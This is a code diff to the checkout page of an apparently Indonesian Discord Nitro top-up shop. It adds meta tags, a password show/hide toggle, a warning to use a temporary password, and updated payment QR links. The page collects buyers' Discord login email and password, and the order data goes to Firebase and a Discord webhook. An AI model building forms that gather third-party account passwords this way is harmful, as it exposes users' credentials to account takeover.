@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Discord Nitro Premium | Warung 757</title>
+    
+    <meta name="description" content="Layanan Top Up tercepat dan terpercaya untuk Discord Nitro Premium & Server Boost di Warung 757.">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Warung 757 - Discord Nitro Premium">
+    <meta property="og:description" content="Proses kilat, aman, dan terpercaya. Upgrade Discord kamu sekarang!">
+    <meta property="og:image" content="https://i.ibb.co.com/chRN5qRT/1772040416685.png">
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Lexend:wght@500;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -76,8 +83,11 @@
         .step-num { width: 32px; height: 32px; background: var(--gold); color: var(--dark-blue); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.95rem; flex-shrink: 0; }
         .step-header h3 { font-size: 1.1rem; font-weight: 700; color: var(--white); }
 
+        /* Input Box & Wrapper Mata */
+        .pass-wrapper { position: relative; width: 100%; }
         .input-box { width: 100%; padding: 14px; background: #0a0e27; border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 10px; color: white; margin-bottom: 12px; outline: none; transition: 0.3s; font-family: var(--font-body); font-size: 0.9rem; }
         .input-box:focus { border-color: var(--gold); background: #000; }
+        .toggle-pass { position: absolute; right: 15px; top: 15px; color: var(--gold); cursor: pointer; opacity: 0.7; }
 
         .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
         .price-item { 
@@ -117,6 +127,9 @@
         .notif-container.show { top: 20px; }
         .notif-text h4 { font-weight: 700; font-size: 0.9rem; }
         .notif-text p { font-size: 0.8rem; color: #666; }
+
+        /* Catatan Keamanan */
+        .security-note { font-size: 0.75rem; color: #ffb700; background: rgba(255, 183, 0, 0.1); padding: 10px; border-radius: 8px; margin-top: 10px; display: flex; gap: 10px; align-items: center; border: 1px solid rgba(255, 183, 0, 0.2); }
     </style>
 </head>
 <body>
@@ -150,7 +163,15 @@
                     <h3>Masukkan Data Akun</h3>
                 </div>
                 <input type="text" id="dsc-user" class="input-box" placeholder="Email / No. HP Discord">
-                <input type="password" id="dsc-pass" class="input-box" placeholder="Password Discord">
+                <div class="pass-wrapper">
+                    <input type="password" id="dsc-pass" class="input-box" placeholder="Password Discord">
+                    <i class="fas fa-eye toggle-pass" onclick="togglePassword()"></i>
+                </div>
+                
+                <div class="security-note">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Harap gunakan password sementara dan ganti kembali setelah proses selesai demi keamanan.</span>
+                </div>
             </div>
 
             <div class="section-card" id="card-step-2">
@@ -257,6 +278,19 @@
         let selected = null;
         let chosenMethod = null;
 
+        // Toggle Password Show/Hide
+        window.togglePassword = () => {
+            const input = document.getElementById('dsc-pass');
+            const icon = document.querySelector('.toggle-pass');
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = "password";
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        };
+
         // Load Produk
         onValue(ref(db, 'settings/discord_prices'), (snapshot) => {
             const container = document.getElementById('productContainer');
@@ -321,10 +355,10 @@
                 document.getElementById('qrArea').style.display = 'none'; document.getElementById('bankArea').style.display = 'block';
             } else if (chosenMethod === "QRIS DANA ONLY") {
                 document.getElementById('bankArea').style.display = 'none'; document.getElementById('qrArea').style.display = 'block';
-                qrImg.src = "https://i.ibb.co/n87h8ZVh/qr-ID1022167478307-25-02-26-177195989-1771959903434.jpg";
+                qrImg.src = "https://i.ibb.co.com/n87h8ZVh/qr-ID1022167478307-25-02-26-177195989-1771959903434.jpg";
             } else {
                 document.getElementById('bankArea').style.display = 'none'; document.getElementById('qrArea').style.display = 'block';
-                qrImg.src = "https://i.ibb.co/chRN5qRT/1772040416685.png";
+                qrImg.src = "https://i.ibb.co.com/chRN5qRT/1772040416685.png";
             }
         };
 
@@ -365,15 +399,12 @@
             };
 
             try {
-                // Simpan ke Firebase
                 await set(ref(db, 'transactions/' + trxId), data);
                 
-                // Simpan ke Riwayat (Global key: robloxHistory)
                 let history = JSON.parse(localStorage.getItem('robloxHistory')) || [];
                 history.unshift(data);
                 localStorage.setItem('robloxHistory', JSON.stringify(history));
 
-                // Kirim Webhook Discord
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ 
                     embeds: [{ 
